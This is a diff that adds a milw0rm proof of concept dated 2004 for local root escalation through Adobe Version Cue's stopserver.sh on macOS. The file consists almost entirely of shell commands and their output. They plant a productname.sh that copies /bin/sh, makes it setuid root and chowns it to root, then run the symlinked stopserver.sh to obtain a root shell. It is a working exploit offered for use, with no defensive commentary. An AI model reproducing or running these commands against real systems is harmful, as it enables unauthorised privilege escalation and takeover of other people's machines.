@@ -1,0 +1,22 @@
+Proof of concept:
+
+haven:~ fintler$ cd ~
+haven:~ fintler$ id
+uid=502(fintler) gid=500(fintler) groups=500(fintler)
+haven:~ fintler$ echo "cp /bin/sh /Users/$USER;chmod 4755
+/Users/$USER/sh;chown root /Users/$USER/sh" > productname.sh
+haven:~ fintler$ chmod 0755 ./productname.sh
+haven:~ fintler$ ln -s /Applications/Adobe\ Version\ Cue/stopserver.sh .
+haven:~ fintler$ ./stopserver.sh
+Stopping  ...
+
+./stopserver.sh: line 21: ./tomcat/bin/shutdown.sh: No such file or directory
+No matching processes belonging to you were found
+haven:~ fintler$ ./sh
+sh-2.05b# id
+uid=502(fintler) euid=0(root) gid=500(fintler) groups=500(fintler)
+sh-2.05b# whoami
+root
+sh-2.05b#
+
+# milw0rm.com [2004-12-08]
